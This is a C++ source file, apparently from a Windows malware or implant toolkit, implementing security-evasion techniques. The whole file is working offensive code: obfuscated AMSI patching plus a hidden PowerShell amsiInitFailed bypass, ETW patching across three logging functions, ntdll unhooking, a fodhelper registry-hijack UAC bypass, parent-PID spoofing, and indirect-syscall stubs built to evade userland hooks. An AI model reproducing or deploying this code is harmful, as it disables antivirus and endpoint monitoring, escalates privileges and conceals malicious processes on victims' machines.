// ============================================================================
// evasion.cpp — EDR/AV Evasion Techniques Implementation
// ============================================================================
#include "evasion.h"
#include "obfuscation.h"
#include "api_table.h"

#ifdef _WIN32

#include <cstring>
#include <random>

// ============================================================================
// Static buffers for indirect syscalls (defined here, declared extern in header)
// ============================================================================
unsigned char g_indirect_stub_protect_vm[INDIRECT_STUB_SIZE] = {0};
unsigned char g_indirect_stub_write_vm[INDIRECT_STUB_SIZE] = {0};
bool g_indirect_initialized = false;
void* g_ntdll_syscall_ret = NULL;

// ============================================================================
// HOOK DETECTION — Check if ntdll .text section differs from disk
// ============================================================================
// Compares first N bytes of each exported ntdll function between in-memory
// and on-disk versions. If they differ, the function has been hooked by EDR.
// ============================================================================
bool isNtdllHooked() {
    HMODULE hNtdll = getModuleByHash(COMPILE_HASH("ntdll"));
    if (!hNtdll) return false;

    BYTE* mem_base = (BYTE*)hNtdll;

    HANDLE hFile = g_api.CreateFileA(
        OBF("C:\\Windows\\System32\\ntdll.dll"),
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HANDLE hMapping = g_api.CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) { g_api.CloseHandle(hFile); return false; }

    LPVOID disk_map = g_api.MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!disk_map) { g_api.CloseHandle(hMapping); g_api.CloseHandle(hFile); return false; }

    bool hooked = false;
    IMAGE_DOS_HEADER* dos_disk = (IMAGE_DOS_HEADER*)disk_map;
    IMAGE_DOS_HEADER* dos_mem  = (IMAGE_DOS_HEADER*)mem_base;

    if (dos_disk->e_magic == IMAGE_DOS_SIGNATURE && dos_mem->e_magic == IMAGE_DOS_SIGNATURE) {
        IMAGE_NT_HEADERS* nt_disk = (IMAGE_NT_HEADERS*)((BYTE*)disk_map + dos_disk->e_lfanew);
        IMAGE_NT_HEADERS* nt_mem  = (IMAGE_NT_HEADERS*)(mem_base + dos_mem->e_lfanew);

        if (nt_disk->Signature == IMAGE_NT_SIGNATURE && nt_mem->Signature == IMAGE_NT_SIGNATURE) {
            IMAGE_SECTION_HEADER* sec_disk = IMAGE_FIRST_SECTION(nt_disk);
            IMAGE_SECTION_HEADER* sec_mem  = IMAGE_FIRST_SECTION(nt_mem);

            for (WORD i = 0; i < nt_disk->FileHeader.NumberOfSections; i++) {
                if (memcmp(sec_disk[i].Name, ".text", 5) == 0) {
                    BYTE* disk_code = (BYTE*)disk_map + sec_disk[i].PointerToRawData;
                    BYTE* mem_code  = mem_base + sec_mem[i].VirtualAddress;
                    DWORD check_size = std::min(sec_disk[i].SizeOfRawData, (DWORD)64);

                    // Compare first 64 bytes of .text section
                    if (memcmp(mem_code, disk_code, check_size) != 0) {
                        hooked = true;
                    }
                    break;
                }
            }
        }
    }

    g_api.UnmapViewOfFile(disk_map);
    g_api.CloseHandle(hMapping);
    g_api.CloseHandle(hFile);

    return hooked;
}

// ============================================================================
// AMSI BYPASS
// ============================================================================
void patchAmsi() {
    HMODULE hAmsi = NULL;
    FARPROC pAmsiScanBuffer = NULL;

    // Main logic
    {
        hAmsi = g_api.LoadLibraryA(OBF("amsi.dll"));
        if (!hAmsi) {
            goto try_amsi_init_failed;
        }

        pAmsiScanBuffer = resolveApiByHash(hAmsi, COMPILE_HASH("AmsiScanBuffer"));
        if (!pAmsiScanBuffer) {
            g_api.FreeLibrary(hAmsi);
            goto try_amsi_init_failed;
        }

        // Try to restore clean AmsiScanBuffer from disk
        HANDLE _amsi_file = g_api.CreateFileA(
            OBF("C:\\Windows\\System32\\amsi.dll"),
            GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        if (_amsi_file == INVALID_HANDLE_VALUE) {
            goto fallback_patch_amsi;
        }

        HANDLE _amsi_map = g_api.CreateFileMappingA(_amsi_file, NULL, PAGE_READONLY, 0, 0, NULL);
        if (!_amsi_map) { g_api.CloseHandle(_amsi_file); goto fallback_patch_amsi; }

        LPVOID _amsi_disk = g_api.MapViewOfFile(_amsi_map, FILE_MAP_READ, 0, 0, 0);
        if (!_amsi_disk) { g_api.CloseHandle(_amsi_map); g_api.CloseHandle(_amsi_file); goto fallback_patch_amsi; }

        IMAGE_DOS_HEADER* _amsi_dos = (IMAGE_DOS_HEADER*)_amsi_disk;
        IMAGE_NT_HEADERS* _amsi_nt = (IMAGE_NT_HEADERS*)((BYTE*)_amsi_disk + _amsi_dos->e_lfanew);

        if (_amsi_dos->e_magic == IMAGE_DOS_SIGNATURE && _amsi_nt->Signature == IMAGE_NT_SIGNATURE) {
            IMAGE_EXPORT_DIRECTORY* _amsi_exports = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)_amsi_disk +
                _amsi_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            DWORD* _amsi_names     = (DWORD*)((BYTE*)_amsi_disk + _amsi_exports->AddressOfNames);
            WORD*  _amsi_ordinals  = (WORD*)((BYTE*)_amsi_disk + _amsi_exports->AddressOfNameOrdinals);
            DWORD* _amsi_functions = (DWORD*)((BYTE*)_amsi_disk + _amsi_exports->AddressOfFunctions);

            unsigned long _amsi_target = COMPILE_HASH("AmsiScanBuffer");
            BYTE* _clean_amsi_func = NULL;

            for (DWORD _i = 0; _i < _amsi_exports->NumberOfNames; _i++) {
                if (!_amsi_names[_i]) continue;
                char* _name = (char*)((BYTE*)_amsi_disk + _amsi_names[_i]);
                unsigned long _h = 5381;
                int _c;
                while ((_c = *_name++)) _h = ((_h << 5) + _h) + _c;
                if (_h == _amsi_target) {
                    _clean_amsi_func = (BYTE*)_amsi_disk + _amsi_functions[_amsi_ordinals[_i]];
                    break;
                }
            }

            if (_clean_amsi_func) {
                unsigned char _clean_bytes[6];
                memcpy(_clean_bytes, _clean_amsi_func, 6);

                unsigned char _patch[6];
                _patch[0] = 0xB8;
                _patch[1] = 0x57;
                _patch[2] = 0x00;
                _patch[3] = 0x07;
                _patch[4] = 0x80;
                _patch[5] = 0xC3;

                unsigned char _obf[6];
                for (int _i = 0; _i < 6; _i++) _obf[_i] = _patch[_i] ^ _clean_bytes[_i % 6];

                initIndirectSyscall();

                DWORD _old_prot;
                unsigned char _final_patch[6];
                for (int _i = 0; _i < 6; _i++) _final_patch[_i] = _obf[_i] ^ _clean_bytes[_i % 6];

                if (virtualProtectDirect((LPVOID)pAmsiScanBuffer, sizeof(_final_patch), PAGE_EXECUTE_READWRITE, &_old_prot)) {
                    memcpy((void*)pAmsiScanBuffer, _final_patch, sizeof(_final_patch));
                    virtualProtectDirect((LPVOID)pAmsiScanBuffer, sizeof(_final_patch), _old_prot, &_old_prot);
                }
            }
            g_api.UnmapViewOfFile(_amsi_disk);
            g_api.CloseHandle(_amsi_map);
            g_api.CloseHandle(_amsi_file);
        }
        g_api.FreeLibrary(hAmsi);
    }
    return;

fallback_patch_amsi:
    {
        unsigned char _patch[6];
        const unsigned char _mask[6] = { 0xE5, 0x2A, 0x77, 0x70, 0xF7, 0xB6 };
        const unsigned char _xor[6]  = { 0x5D, 0x7D, 0x77, 0x77, 0x77, 0x75 };
        for (int _i = 0; _i < 6; _i++) _patch[_i] = _mask[_i] ^ _xor[_i];

        initIndirectSyscall();
        DWORD _old;
        if (virtualProtectDirect((LPVOID)pAmsiScanBuffer, sizeof(_patch), PAGE_EXECUTE_READWRITE, &_old)) {
            memcpy((void*)pAmsiScanBuffer, _patch, sizeof(_patch));
            virtualProtectDirect((LPVOID)pAmsiScanBuffer, sizeof(_patch), _old, &_old);
        }
        g_api.FreeLibrary(hAmsi);
    }

try_amsi_init_failed:
    {
        // amsiInitFailed reflection bypass (PowerShell/.NET)
        const char* _ps_cmd = OBF("powershell -NoProfile -Command "
            "\"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
            ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);\"");
        g_api.WinExec((LPCSTR)_ps_cmd, SW_HIDE);
    }
}

// ============================================================================
// ETW BYPASS
// ============================================================================
void patchETW() {
    FARPROC pEtwEventWrite = NULL;

    {
        HMODULE hNtdll = getModuleByHash(COMPILE_HASH("ntdll"));
        if (!hNtdll) return;

        pEtwEventWrite = resolveApiByHash(hNtdll, COMPILE_HASH("EtwEventWrite"));
        if (!pEtwEventWrite) return;

        HANDLE _etw_file = g_api.CreateFileA(
        OBF("C:\\Windows\\System32\\ntdll.dll"),
            GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        if (_etw_file == INVALID_HANDLE_VALUE) goto fallback_patch_etw;

        HANDLE _etw_map = g_api.CreateFileMappingA(_etw_file, NULL, PAGE_READONLY, 0, 0, NULL);
        if (!_etw_map) { g_api.CloseHandle(_etw_file); goto fallback_patch_etw; }

        LPVOID _etw_disk = g_api.MapViewOfFile(_etw_map, FILE_MAP_READ, 0, 0, 0);
        if (!_etw_disk) { g_api.CloseHandle(_etw_map); g_api.CloseHandle(_etw_file); goto fallback_patch_etw; }

        bool _etw_restored = false;
        IMAGE_DOS_HEADER* _etw_dos = (IMAGE_DOS_HEADER*)_etw_disk;
        IMAGE_NT_HEADERS* _etw_nt = (IMAGE_NT_HEADERS*)((BYTE*)_etw_disk + _etw_dos->e_lfanew);

        if (_etw_dos->e_magic == IMAGE_DOS_SIGNATURE && _etw_nt->Signature == IMAGE_NT_SIGNATURE) {
            IMAGE_EXPORT_DIRECTORY* _etw_exports = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)_etw_disk +
                _etw_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            DWORD* _etw_names = (DWORD*)((BYTE*)_etw_disk + _etw_exports->AddressOfNames);
            WORD*  _etw_ordinals = (WORD*)((BYTE*)_etw_disk + _etw_exports->AddressOfNameOrdinals);
            DWORD* _etw_functions = (DWORD*)((BYTE*)_etw_disk + _etw_exports->AddressOfFunctions);

            unsigned long _etw_target = COMPILE_HASH("EtwEventWrite");
            BYTE* _clean_etw_func = NULL;

            for (DWORD _i = 0; _i < _etw_exports->NumberOfNames; _i++) {
                if (!_etw_names[_i]) continue;
                char* _name = (char*)((BYTE*)_etw_disk + _etw_names[_i]);
                unsigned long _h = 5381;
                int _c;
                while ((_c = *_name++)) _h = ((_h << 5) + _h) + _c;
                if (_h == _etw_target) {
                    _clean_etw_func = (BYTE*)_etw_disk + _etw_functions[_etw_ordinals[_i]];
                    break;
                }
            }

            if (_clean_etw_func) {
                unsigned char _clean_etw_bytes[4];
                memcpy(_clean_etw_bytes, _clean_etw_func, 4);

                unsigned char _etw_patch[4] = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax, rax; ret
                unsigned char _etw_obf[4];
                for (int _i = 0; _i < 4; _i++)
                    _etw_obf[_i] = _etw_patch[_i] ^ _clean_etw_bytes[_i % 4];

                initIndirectSyscall();

                DWORD _old;
                unsigned char _final_patch[4];
                for (int _i = 0; _i < 4; _i++)
                    _final_patch[_i] = _etw_obf[_i] ^ _clean_etw_bytes[_i % 4];

                if (virtualProtectDirect((LPVOID)pEtwEventWrite, sizeof(_final_patch), PAGE_EXECUTE_READWRITE, &_old)) {
                    memcpy((void*)pEtwEventWrite, _final_patch, sizeof(_final_patch));
                    virtualProtectDirect((LPVOID)pEtwEventWrite, sizeof(_final_patch), _old, &_old);
                    _etw_restored = true;
                }
            }
        }
        g_api.UnmapViewOfFile(_etw_disk);
        g_api.CloseHandle(_etw_map);
        g_api.CloseHandle(_etw_file);
        if (_etw_restored) return;
    }

fallback_patch_etw:
    {
        unsigned char _patch[4];
        const unsigned char _mask[4] = { 0x35, 0x44, 0xB7, 0xB4 };
        const unsigned char _xork[4] = { 0x7D, 0x77, 0x77, 0x77 };
        for (int _i = 0; _i < 4; _i++) _patch[_i] = _mask[_i] ^ _xork[_i];

        initIndirectSyscall();
        DWORD _old;
        if (virtualProtectDirect((LPVOID)pEtwEventWrite, sizeof(_patch), PAGE_EXECUTE_READWRITE, &_old)) {
            memcpy((void*)pEtwEventWrite, _patch, sizeof(_patch));
            virtualProtectDirect((LPVOID)pEtwEventWrite, sizeof(_patch), _old, &_old);
        }
    }
}

// ============================================================================
// DEEPER ETW PATCHING — Also patch NtTraceEvent + EtwEventWriteTransfer
// ============================================================================
// Some EDRs use NtTraceEvent (ntdll) instead of EtwEventWrite for ETW.
// This function patches both additional ETW entry points.
// ============================================================================
void patchEtwDeep() {
    // First, do the standard EtwEventWrite patch
    patchETW();

    HMODULE hNtdll = getModuleByHash(COMPILE_HASH("ntdll"));
    if (!hNtdll) return;

    // Patch NtTraceEvent (used by some EDRs as secondary ETW channel)
    FARPROC pNtTraceEvent = resolveApiByHash(hNtdll, COMPILE_HASH("NtTraceEvent"));
    if (pNtTraceEvent) {
        unsigned char _nt_patch[4] = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax,rax; ret
        DWORD _old_nt;
        initIndirectSyscall();
        if (virtualProtectDirect((LPVOID)pNtTraceEvent, sizeof(_nt_patch), PAGE_EXECUTE_READWRITE, &_old_nt)) {
            memcpy((void*)pNtTraceEvent, _nt_patch, sizeof(_nt_patch));
            virtualProtectDirect((LPVOID)pNtTraceEvent, sizeof(_nt_patch), _old_nt, &_old_nt);
        }
    }

    // Patch EtwEventWriteTransfer (writes with activity ID — some EDRs use this)
    FARPROC pEtwWriteTransfer = resolveApiByHash(hNtdll, COMPILE_HASH("EtwEventWriteTransfer"));
    if (pEtwWriteTransfer) {
        unsigned char _tr_patch[4] = { 0x48, 0x33, 0xC0, 0xC3 };
        DWORD _old_tr;
        initIndirectSyscall();
        if (virtualProtectDirect((LPVOID)pEtwWriteTransfer, sizeof(_tr_patch), PAGE_EXECUTE_READWRITE, &_old_tr)) {
            memcpy((void*)pEtwWriteTransfer, _tr_patch, sizeof(_tr_patch));
            virtualProtectDirect((LPVOID)pEtwWriteTransfer, sizeof(_tr_patch), _old_tr, &_old_tr);
        }
    }
}

// ============================================================================
// SYSCALL UNHOOKING — Restore clean ntdll from disk
// ============================================================================
void unhookNtdll() {
    HMODULE hNtdllMem = getModuleByHash(COMPILE_HASH("ntdll"));
    if (!hNtdllMem) return;

    BYTE* mem_base = (BYTE*)hNtdllMem;

    HANDLE hFile = g_api.CreateFileA(
        OBF("C:\\Windows\\System32\\ntdll.dll"),
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMapping = g_api.CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) { g_api.CloseHandle(hFile); return; }

    LPVOID disk_map = g_api.MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!disk_map) { g_api.CloseHandle(hMapping); g_api.CloseHandle(hFile); return; }

    IMAGE_DOS_HEADER* dos_disk = (IMAGE_DOS_HEADER*)disk_map;
    IMAGE_DOS_HEADER* dos_mem  = (IMAGE_DOS_HEADER*)mem_base;

    if (dos_disk->e_magic != IMAGE_DOS_SIGNATURE || dos_mem->e_magic != IMAGE_DOS_SIGNATURE) {
        g_api.UnmapViewOfFile(disk_map); g_api.CloseHandle(hMapping); g_api.CloseHandle(hFile);
        return;
    }

    IMAGE_NT_HEADERS* nt_disk = (IMAGE_NT_HEADERS*)((BYTE*)disk_map + dos_disk->e_lfanew);
    IMAGE_NT_HEADERS* nt_mem  = (IMAGE_NT_HEADERS*)(mem_base + dos_mem->e_lfanew);

    if (nt_disk->Signature != IMAGE_NT_SIGNATURE || nt_mem->Signature != IMAGE_NT_SIGNATURE) {
        g_api.UnmapViewOfFile(disk_map); g_api.CloseHandle(hMapping); g_api.CloseHandle(hFile);
        return;
    }

    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt_disk);
    WORD sections_count = nt_disk->FileHeader.NumberOfSections;
    int restored = 0;

    for (WORD i = 0; i < sections_count; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            BYTE* disk_code = (BYTE*)disk_map + sections[i].PointerToRawData;
            BYTE* mem_code  = mem_base + sections[i].VirtualAddress;
            DWORD raw_size = sections[i].SizeOfRawData;
            DWORD virt_size = sections[i].Misc.VirtualSize;
            DWORD section_size = (virt_size > 0 && virt_size < raw_size) ? virt_size : raw_size;
            if (section_size == 0) continue;

            DWORD old_prot;
            if (virtualProtectDirect(mem_code, section_size, PAGE_EXECUTE_READWRITE, &old_prot)) {
                memcpy(mem_code, disk_code, section_size);
                virtualProtectDirect(mem_code, section_size, old_prot, &old_prot);
                restored++;
            }
            break;
        }
    }

    for (WORD i = 0; i < sections_count; i++) {
        if (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (memcmp(sections[i].Name, ".text", 5) == 0) continue;
            BYTE* disk_code = (BYTE*)disk_map + sections[i].PointerToRawData;
            BYTE* mem_code  = mem_base + sections[i].VirtualAddress;
            DWORD raw_size = sections[i].SizeOfRawData;
            DWORD virt_size = sections[i].Misc.VirtualSize;
            DWORD section_size = (virt_size > 0 && virt_size < raw_size) ? virt_size : raw_size;
            if (section_size == 0) continue;

            DWORD old_prot;
            if (virtualProtectDirect(mem_code, section_size, PAGE_EXECUTE_READWRITE, &old_prot)) {
                memcpy(mem_code, disk_code, section_size);
                virtualProtectDirect(mem_code, section_size, old_prot, &old_prot);
                restored++;
            }
        }
    }

    g_api.UnmapViewOfFile(disk_map);
    g_api.CloseHandle(hMapping);
    g_api.CloseHandle(hFile);
}

// ============================================================================
// UAC BYPASS — fodhelper.exe Registry Hijack
// ============================================================================
void bypassUac(const std::string& command_to_execute) {
    std::string cmd = command_to_execute.empty() ?
        "C:\\Windows\\System32\\cmd.exe /c start cmd.exe" : command_to_execute;

    HKEY hKey;
    LONG result;

    result = g_api.RegCreateKeyExA(HKEY_CURRENT_USER,
        OBF("Software\\Classes\\ms-settings\\Shell\\Open\\command"),
        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) return;

    g_api.RegSetValueExA(hKey, OBF("DelegateExecute"), 0, REG_SZ, (BYTE*)"", 1);
    g_api.RegSetValueExA(hKey, OBF(""), 0, REG_SZ, (BYTE*)cmd.c_str(), cmd.length() + 1);
    g_api.RegCloseKey(hKey);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(SHELLEXECUTEINFOA);
    sei.lpFile = OBF("fodhelper.exe");
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;

    if (g_api.ShellExecuteExA(&sei)) {
        g_api.WaitForSingleObject(sei.hProcess, 3000);
        g_api.CloseHandle(sei.hProcess);
    }

    g_api.RegDeleteKeyExA(HKEY_CURRENT_USER,
        OBF("Software\\Classes\\ms-settings\\Shell\\Open\\command"), KEY_WOW64_64KEY, 0);
    g_api.RegDeleteKeyExA(HKEY_CURRENT_USER,
        OBF("Software\\Classes\\ms-settings\\Shell"), KEY_WOW64_64KEY, 0);
}

// ============================================================================
// PARENT PID SPOOFING — Create process with spoofed parent
// ============================================================================
// Creates a new process whose parent PID appears to be a different process.
// This bypasses EDR detections that flag processes spawned from suspicious
// parents (e.g., cmd.exe spawned by MWare.exe is suspicious, but if the
// parent shows as explorer.exe, it looks legitimate).
// ============================================================================
// Uses PROC_THREAD_ATTRIBUTE_PARENT_PROCESS with InitializeProcThreadAttributeList.
// Requires Windows 8+ / Server 2012+.
// ============================================================================
bool createProcessWithSpoofedParent(LPCSTR lpApplicationName, LPSTR lpCommandLine,
                                     DWORD dwParentPID, LPPROCESS_INFORMATION lpProcessInformation) {
    if (!lpProcessInformation) return false;

    // Open the target parent process
    HANDLE hParent = g_api.OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwParentPID);
    if (!hParent) return false;

    // Prepare startup info with extended attributes
    STARTUPINFOEXA si = {0};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // First call to get required attribute list size
    SIZE_T attrSize = 0;
    g_api.InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);

    // Allocate attribute list
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        g_api.GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
    if (!si.lpAttributeList) {
        g_api.CloseHandle(hParent);
        return false;
    }

    // Initialize the attribute list
    if (!g_api.InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize)) {
        g_api.HeapFree(g_api.GetProcessHeap(), 0, si.lpAttributeList);
        g_api.CloseHandle(hParent);
        return false;
    }

    // Add parent process attribute
    if (!g_api.UpdateProcThreadAttribute(si.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL)) {
        g_api.DeleteProcThreadAttributeList(si.lpAttributeList);
        g_api.HeapFree(g_api.GetProcessHeap(), 0, si.lpAttributeList);
        g_api.CloseHandle(hParent);
        return false;
    }

    // Create the process with spoofed parent
    BOOL created = g_api.CreateProcessA(
        lpApplicationName, lpCommandLine, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
        NULL, NULL, &si.StartupInfo, lpProcessInformation);

    // Clean up
    g_api.DeleteProcThreadAttributeList(si.lpAttributeList);
    g_api.HeapFree(g_api.GetProcessHeap(), 0, si.lpAttributeList);
    g_api.CloseHandle(hParent);

    return created != FALSE;
}

// ============================================================================
// HELL'S GATE — Indirect Syscall
// ============================================================================
static DWORD resolveSyscallNumber(unsigned long target_hash) {
    // target_hash = COMPILE_HASH("NtProtectVirtualMemory") or similar
    // No strcmp — pure hash comparison, zero plaintext in binary
    HANDLE hFile = g_api.CreateFileA(
        OBF("C:\\Windows\\System32\\ntdll.dll"),
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return 0;

    HANDLE hMapping = g_api.CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMapping) { g_api.CloseHandle(hFile); return 0; }

    LPVOID mapped = g_api.MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!mapped) { g_api.CloseHandle(hMapping); g_api.CloseHandle(hFile); return 0; }

    DWORD result = 0;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)mapped;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)mapped + dos->e_lfanew);

    if (dos->e_magic == IMAGE_DOS_SIGNATURE && nt->Signature == IMAGE_NT_SIGNATURE) {
        IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)mapped +
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

        DWORD* names     = (DWORD*)((BYTE*)mapped + exports->AddressOfNames);
        WORD*  ordinals  = (WORD*)((BYTE*)mapped + exports->AddressOfNameOrdinals);
        DWORD* functions = (DWORD*)((BYTE*)mapped + exports->AddressOfFunctions);

        for (DWORD i = 0; i < exports->NumberOfNames; i++) {
            char* name = (char*)((BYTE*)mapped + names[i]);
            // djb2 hash — matches COMPILE_HASH() at compile time
            unsigned long h = 5381;
            int c;
            while ((c = *name++)) h = ((h << 5) + h) + c;
            if (h == target_hash) {
                BYTE* func_ptr = (BYTE*)mapped + functions[ordinals[i]];
                if (func_ptr[0] == 0x4C && func_ptr[1] == 0x8B &&
                    func_ptr[2] == 0xD1 && func_ptr[3] == 0xB8) {
                    result = *(DWORD*)(func_ptr + 4);
                }
                break;
            }
        }
    }

    g_api.UnmapViewOfFile(mapped);
    g_api.CloseHandle(hMapping);
    g_api.CloseHandle(hFile);
    return result;
}

static bool buildIndirectSyscallStub(unsigned char* buffer, DWORD syscall_num, void* ntdll_syscall_ret) {
    if (syscall_num == 0 || !ntdll_syscall_ret) return false;

    int offset = 0;

    // mov r10, rcx  (save first argument for syscall — required by x64 syscall convention)
    buffer[offset++] = 0x4C; buffer[offset++] = 0x8B; buffer[offset++] = 0xD1;

    // mov eax, <syscall_num>
    buffer[offset++] = 0xB8;
    buffer[offset++] = (syscall_num)        & 0xFF;
    buffer[offset++] = (syscall_num >> 8)   & 0xFF;
    buffer[offset++] = (syscall_num >> 16)  & 0xFF;
    buffer[offset++] = (syscall_num >> 24)  & 0xFF;

    // mov r11, <ntdll_syscall_ret_addr>
    uint64_t target_addr = (uint64_t)ntdll_syscall_ret;
    buffer[offset++] = 0x49; buffer[offset++] = 0xBB;
    memcpy(&buffer[offset], &target_addr, 8); offset += 8;

    // jmp r11 — jump to ntdll's syscall;ret instruction (bypasses userland hooks)
    buffer[offset++] = 0x41; buffer[offset++] = 0xFF; buffer[offset++] = 0xE3;

    // Pad remaining space with INT3 (should never execute)
    while (offset < INDIRECT_STUB_SIZE) {
        buffer[offset++] = 0xCC;
    }

    return true;
}

bool initIndirectSyscall() {
    if (g_indirect_initialized) return true;

    DWORD sc_protect = resolveSyscallNumber(COMPILE_HASH("NtProtectVirtualMemory"));
    DWORD sc_write   = resolveSyscallNumber(COMPILE_HASH("NtWriteVirtualMemory"));

    if (sc_protect == 0 || sc_write == 0) return false;

    HMODULE hNtdll = getModuleByHash(COMPILE_HASH("ntdll"));
    if (!hNtdll) return false;

    BYTE* ntdll_base = (BYTE*)hNtdll;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)ntdll_base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(ntdll_base + dos->e_lfanew);

    if (dos->e_magic != IMAGE_DOS_SIGNATURE || nt->Signature != IMAGE_NT_SIGNATURE) return false;

    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    void* found_addr = NULL;

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            BYTE* text_start = ntdll_base + sections[i].VirtualAddress;
            DWORD text_size = sections[i].SizeOfRawData;
            for (DWORD j = 0; j < text_size - 2; j++) {
                if (text_start[j] == 0x0F && text_start[j+1] == 0x05 && text_start[j+2] == 0xC3) {
                    found_addr = (void*)(text_start + j);
                    break;
                }
            }
            break;
        }
    }

    if (!found_addr) return false;
    g_ntdll_syscall_ret = found_addr;

    if (!buildIndirectSyscallStub(g_indirect_stub_protect_vm, sc_protect, g_ntdll_syscall_ret)) return false;
    if (!buildIndirectSyscallStub(g_indirect_stub_write_vm, sc_write, g_ntdll_syscall_ret)) return false;

    // ============================================================================
    // MAKE STUBS EXECUTABLE
    // ============================================================================
    DWORD old_protect;
    if (!g_api.VirtualProtect(g_indirect_stub_protect_vm, INDIRECT_STUB_SIZE, PAGE_EXECUTE_READ, &old_protect)) {
        if (!g_api.VirtualProtect(g_indirect_stub_protect_vm, INDIRECT_STUB_SIZE, PAGE_EXECUTE_READWRITE, &old_protect))
            return false;
    }

    DWORD old2;
    if (!g_api.VirtualProtect(g_indirect_stub_write_vm, INDIRECT_STUB_SIZE, PAGE_EXECUTE_READ, &old2)) {
        if (!g_api.VirtualProtect(g_indirect_stub_write_vm, INDIRECT_STUB_SIZE, PAGE_EXECUTE_READWRITE, &old2)) {
            g_api.VirtualProtect(g_indirect_stub_protect_vm, INDIRECT_STUB_SIZE, old_protect, &old_protect);
            return false;
        }
    }

    g_indirect_initialized = true;
    return true;
}

bool virtualProtectDirect(LPVOID address, SIZE_T size, DWORD newProtect, PDWORD oldProtect) {
    if (!g_indirect_initialized) {
        return g_api.VirtualProtect(address, size, newProtect, oldProtect);
    }

    typedef long NTSTATUS;
    typedef NTSTATUS (NTAPI *tIndirectProtectVirtualMemory)(
        HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

    tIndirectProtectVirtualMemory fn = (tIndirectProtectVirtualMemory)(void*)g_indirect_stub_protect_vm;

    HANDLE hProcess   = (HANDLE)(LONG_PTR)-1;
    PVOID  baseAddr   = address;
    SIZE_T regionSize = size;
    ULONG  oldProt;

    NTSTATUS status = fn(hProcess, &baseAddr, &regionSize, newProtect, &oldProt);
    if (oldProtect) *oldProtect = (DWORD)oldProt;
    return status >= 0;
}

bool writeMemoryDirect(HANDLE hProcess, LPVOID baseAddress, LPCVOID buffer,
                       SIZE_T size, SIZE_T* bytesWritten) {
    if (!g_indirect_initialized) {
        return g_api.WriteProcessMemory(hProcess, baseAddress, buffer, size, bytesWritten);
    }

    typedef long NTSTATUS;
    typedef NTSTATUS (NTAPI *tIndirectWriteVirtualMemory)(
        HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

    tIndirectWriteVirtualMemory fn = (tIndirectWriteVirtualMemory)(void*)g_indirect_stub_write_vm;

    SIZE_T written = 0;
    NTSTATUS status = fn(hProcess, baseAddress, (PVOID)buffer, size, &written);
    if (bytesWritten) *bytesWritten = written;
    return status >= 0;
}

#endif // _WIN32
